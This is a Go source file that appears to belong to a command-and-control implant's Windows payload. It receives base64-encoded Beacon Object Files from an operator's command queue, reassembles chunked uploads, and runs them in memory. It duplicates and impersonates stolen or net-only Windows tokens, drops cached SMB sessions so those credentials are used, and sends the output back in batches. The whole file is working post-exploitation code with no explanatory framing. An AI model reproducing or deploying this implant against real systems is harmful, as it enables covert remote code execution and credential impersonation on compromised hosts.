// server/docker/payloads/Windows/action_bof_windows.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	// Increase chunk size to reduce number of database operations
	MAX_CHUNK_SIZE       = 100 * 1024 // 100KB per chunk (was 20KB)
	MAX_SINGLE_RESPONSE  = 500 * 1024 // 500KB max for single response
	MAX_CHUNKS_PER_BATCH = 10         // Batch chunks together
)

var (
	bofExecutionMutex sync.Mutex
)

// ensureTokenContextForBOF ensures the correct token context is applied for BOF execution
// Returns a cleanup function that should be called after BOF execution
func ensureTokenContextForBOF() func() {
	if globalTokenStore == nil {
		return func() {} // No-op cleanup
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var appliedToken syscall.Handle

	// Priority: Network-only token > Regular impersonation
	if globalTokenStore.NetOnlyHandle != 0 {
		// For network-only tokens, we need to duplicate the token for this thread
		var dupToken syscall.Handle
		err := DuplicateTokenEx(
			globalTokenStore.NetOnlyHandle,
			TOKEN_ALL_ACCESS,
			nil,
			SecurityImpersonation,
			TokenImpersonation,
			&dupToken,
		)
		if err == nil {
			appliedToken = dupToken
		} else {
		}
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
			// Duplicate the token for this thread
			var dupToken syscall.Handle
			err := DuplicateTokenEx(
				token,
				TOKEN_ALL_ACCESS,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&dupToken,
			)
			if err == nil {
				appliedToken = dupToken
			} else {
			}
		}
	}

	if appliedToken == 0 {
		return func() {} // No-op if no token to apply
	}

	// Apply the token to the current thread
	err := ImpersonateLoggedOnUser(appliedToken)
	if err != nil {
		CloseHandle(appliedToken)
		return func() {}
	}

	// Verify impersonation was successful
	var threadToken syscall.Token
	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
	if err == nil {
		threadToken.Close()
	}

	// Return cleanup function
	return func() {
		RevertToSelf()
		CloseHandle(appliedToken)
	}
}

func executeBOFPlatform(bofBytes []byte, args []byte) (string, error) {
	// Ensure thread safety for BOF execution
	bofExecutionMutex.Lock()
	defer bofExecutionMutex.Unlock()

	// Check if we need to apply token context
	needsTokenContext := false
	if globalTokenStore != nil {
		globalTokenStore.mu.RLock()
		needsTokenContext = globalTokenStore.NetOnlyHandle != 0 ||
			(globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "")
		globalTokenStore.mu.RUnlock()
	}

	// If we need token context, apply it for this execution
	if needsTokenContext {
		return executeBOFWithTokenContext(bofBytes, args)
	}

	// Otherwise execute normally without token context

	output, err := Load(bofBytes, args)
	if err != nil {
		return "", err
	}

	return output, nil
}

// parseBOFNetworkPath extracts network paths from BOF arguments
func parseBOFNetworkPath(args []byte) string {
	// BOF arguments might contain network paths
	// Look for UNC paths in the packed arguments
	argStr := string(args)

	// Check for \\server\share pattern
	if idx := strings.Index(argStr, "\\\\"); idx >= 0 {
		// Find the end of the share name
		path := argStr[idx:]
		// Extract just the server\share part
		parts := strings.Split(path[2:], "\\")
		if len(parts) >= 2 {
			return "\\\\" + parts[0] + "\\" + parts[1]
		}
	}

	return ""
}

// executeBOFWithTokenContext ensures token context is properly applied for BOF execution
func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {

	// Check what token we need to apply
	globalTokenStore.mu.RLock()
	var tokenToUse syscall.Handle
	var isNetOnly bool

	if globalTokenStore.NetOnlyHandle != 0 {
		tokenToUse = globalTokenStore.NetOnlyHandle
		isNetOnly = true
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {
			tokenToUse = token
			isNetOnly = false
		}
	}
	globalTokenStore.mu.RUnlock()

	if tokenToUse == 0 {
		// No token to apply
		return Load(bofBytes, args)
	}

	// For network-only tokens, aggressively clear any cached SMB sessions
	if isNetOnly {
		// Try to extract the network path from BOF arguments
		networkPath := parseBOFNetworkPath(args)
		if networkPath != "" {
			// Force disconnect with no update to profile
			err := WNetCancelConnection2(networkPath, 0, true)
			if err == nil {
			}

			// Also try IPC$ share
			if idx := strings.Index(networkPath[2:], "\\"); idx > 0 {
				ipcPath := networkPath[:idx+2] + "\\IPC$"
				WNetCancelConnection2(ipcPath, 0, true)
			}
		}

		// Also disconnect all tracked resources
		if networkResourceTracker != nil {
			resources := networkResourceTracker.GetTrackedResources()
			for _, resource := range resources {
				WNetCancelConnection2(resource, 0, true)
			}
		}
	}

	// Apply impersonation for this BOF execution

	// Duplicate the token for this specific operation
	var dupToken syscall.Handle
	err := DuplicateTokenEx(
		tokenToUse,
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&dupToken,
	)
	if err != nil {
		// Try with the original token
		dupToken = tokenToUse
	} else {
		// We duplicated the token, so we need to close it later
		defer CloseHandle(dupToken)
	}

	// Apply impersonation using ImpersonateLoggedOnUser
	err = ImpersonateLoggedOnUser(dupToken)
	if err != nil {
		// Try to execute anyway without impersonation
		return Load(bofBytes, args)
	}

	// Execute BOF with token context
	output, execErr := Load(bofBytes, args)

	// IMPORTANT: Always revert impersonation after BOF execution
	// This prevents the impersonation from persisting on the thread
	RevertToSelf()

	if execErr != nil {
		return "", execErr
	}

	return output, nil
}

// executeBOFPlatformAsync is for async BOF execution with 30-minute timeout
func executeBOFPlatformAsync(bofBytes []byte, args []byte) (string, error) {
	// Ensure thread safety for BOF execution
	bofExecutionMutex.Lock()
	defer bofExecutionMutex.Unlock()

	// For async BOF, we handle token context differently (in the goroutine)
	// So just log and execute

	// Use LoadWithTimeout for 30-minute timeout
	output, err := LoadWithTimeout(bofBytes, args, 30*time.Minute)

	if err != nil {
		return "", err
	}

	return output, nil
}

// processBOF is the Windows-specific implementation
func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
	// Handle multi-chunk BOF file uploads first
	if cmd.TotalChunks > 1 && cmd.Data != "" {
		return cq.handleChunkedBOF(cmd)
	}

	// Decode the BOF data from base64
	bofBytes, err := base64.StdEncoding.DecodeString(cmd.Data)
	if err != nil {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E18),
			Error:       err,
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Log BOF details and current token context

	// Debug: Log current token state
	if globalTokenStore != nil {
		globalTokenStore.mu.RLock()
		if globalTokenStore.NetOnlyHandle != 0 {
		} else if globalTokenStore.IsImpersonating {
		} else {
		}
		globalTokenStore.mu.RUnlock()
	}

	// Parse any arguments that might be in the command
	var bofArgs []byte
	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof ") {
		// Extract arguments after "bof "
		argString := strings.TrimPrefix(cmd.Command, "bof ")
		if argString != "" {
			// Parse the arguments using the lighthouse package format
			parsedArgs, err := parseBOFArguments(argString)
			if err != nil {
			} else {
				bofArgs = parsedArgs
			}
		}
	}

	// Execute the BOF (token context is handled inside executeBOFPlatform)
	output, err := executeBOFPlatform(bofBytes, bofArgs)

	// IMPORTANT: Clear the Filename field for BOF results
	resultCmd := cmd
	resultCmd.Filename = "" // Clear filename to avoid file operation confusion

	// Check output size
	outputLen := len(output)

	// For extremely large outputs, consider using async BOF or compression
	if outputLen > MAX_SINGLE_RESPONSE {
		// Use larger chunks to reduce database operations
		chunks := splitIntoChunks(output, MAX_CHUNK_SIZE)
		totalChunks := len(chunks)

		// Batch chunks together to reduce database operations
		batchedResults := make([]*CommandResult, 0)

		for i, chunk := range chunks {
			chunkResult := &CommandResult{
				Command: Command{
					Command:      resultCmd.Command,
					CommandID:    resultCmd.CommandID,
					CommandDBID:  resultCmd.CommandDBID,
					AgentID:      resultCmd.AgentID,
					CurrentChunk: i + 1,
					TotalChunks:  totalChunks,
				},
				Output:      fmt.Sprintf("C%d/%d\n%s", i+1, totalChunks, chunk),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}

			if err != nil {
				chunkResult.Error = err
				chunkResult.ErrorString = Err(E25)
				chunkResult.ExitCode = 1
				if i == 0 {
					chunkResult.Output = ErrCtx(E25, chunk)
				}
			}

			batchedResults = append(batchedResults, chunkResult)

			// Send batch when we reach the limit or on last chunk
			if len(batchedResults) >= MAX_CHUNKS_PER_BATCH || i == len(chunks)-1 {
				// Add all batched results at once
				for _, result := range batchedResults {
					if err := resultManager.AddResult(result); err != nil {
					}
				}

				// Add small delay between batches to prevent overwhelming the server
				if i < len(chunks)-1 {
					time.Sleep(100 * time.Millisecond)
				}

				batchedResults = batchedResults[:0] // Clear batch
			}
		}

		return CommandResult{
			Command:     resultCmd,
			Output:      SuccCtx(S5, fmt.Sprintf("%d/%d", outputLen, totalChunks)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Output is small enough to send as one piece
	if err != nil {
		return CommandResult{
			Command:     resultCmd,
			Output:      ErrCtx(E25, output),
			Error:       err,
			ErrorString: Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Command:     resultCmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// BOFChunkInfo tracks chunked BOF uploads
type BOFChunkInfo struct {
	Filename    string
	TotalChunks int
	Chunks      map[int]string // chunk number -> base64 data
	ReceivedAt  time.Time
}

var (
	bofChunks      = make(map[string]*BOFChunkInfo) // commandID -> chunk info
	bofChunksMutex sync.Mutex
)

// handleChunkedBOF handles multi-chunk BOF uploads
func (cq *CommandQueue) handleChunkedBOF(cmd Command) CommandResult {
	bofChunksMutex.Lock()
	defer bofChunksMutex.Unlock()

	// Get or create chunk info
	chunkInfo, exists := bofChunks[cmd.CommandID]
	if !exists {
		chunkInfo = &BOFChunkInfo{
			Filename:    cmd.Filename,
			TotalChunks: cmd.TotalChunks,
			Chunks:      make(map[int]string),
			ReceivedAt:  time.Now(),
		}
		bofChunks[cmd.CommandID] = chunkInfo
	}

	// Store this chunk
	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data


	// Check if all chunks received
	if len(chunkInfo.Chunks) < cmd.TotalChunks {
		return CommandResult{
			Command:     cmd,
			Output:      SuccCtx(S0, fmt.Sprintf("%d/%d", cmd.CurrentChunk+1, cmd.TotalChunks)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// All chunks received, reassemble and execute

	// Reassemble the BOF
	var fullData strings.Builder
	for i := 0; i < cmd.TotalChunks; i++ {
		chunk, ok := chunkInfo.Chunks[i]
		if !ok {
			return CommandResult{
				Command:     cmd,
				Output:      ErrCtx(E24, fmt.Sprintf("%d", i)),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		fullData.WriteString(chunk)
	}

	// Clean up chunk storage
	delete(bofChunks, cmd.CommandID)

	// Update the command with the reassembled data
	cmd.Data = fullData.String()
	cmd.TotalChunks = 1
	cmd.CurrentChunk = 0

	// Now process the complete BOF (recursive call)
	return cq.processBOF(cmd)
}

// handleChunkedBOFAsync handles multi-chunk async BOF uploads
func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
	bofChunksMutex.Lock()
	defer bofChunksMutex.Unlock()

	chunkInfo, exists := bofChunks[cmd.CommandID]
	if !exists {
		chunkInfo = &BOFChunkInfo{
			Filename:    cmd.Filename,
			TotalChunks: cmd.TotalChunks,
			Chunks:      make(map[int]string),
			ReceivedAt:  time.Now(),
		}
		bofChunks[cmd.CommandID] = chunkInfo
	}

	chunkInfo.Chunks[cmd.CurrentChunk] = cmd.Data


	if len(chunkInfo.Chunks) < cmd.TotalChunks {
		return CommandResult{
			Command:     cmd,
			Output:      SuccCtx(S0, fmt.Sprintf("%d/%d", cmd.CurrentChunk+1, cmd.TotalChunks)),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// All chunks received, reassemble
	var fullData strings.Builder
	for i := 0; i < cmd.TotalChunks; i++ {
		chunk, ok := chunkInfo.Chunks[i]
		if !ok {
			return CommandResult{
				Command:     cmd,
				Output:      ErrCtx(E24, fmt.Sprintf("%d", i)),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
		fullData.WriteString(chunk)
	}

	delete(bofChunks, cmd.CommandID)

	// Decode BOF
	bofBytes, err := base64.StdEncoding.DecodeString(fullData.String())
	if err != nil {
		return CommandResult{
			Command:     cmd,
			Output:      Err(E18),
			Error:       err,
			ErrorString: Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Parse arguments
	var bofArgs []byte
	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof-async ") {
		argString := strings.TrimPrefix(cmd.Command, "bof-async ")
		if argString != "" {
			args := strings.Fields(argString)
			if len(args) > 0 {
				packedArgs, err := PackArgs(args)
				if err != nil {
				} else {
					bofArgs = packedArgs
				}
			}
		}
	}

	// Execute async (token context will be captured in executeBOFAsyncPlatform)
	return executeBOFAsyncPlatform(cmd, bofBytes, bofArgs)
}
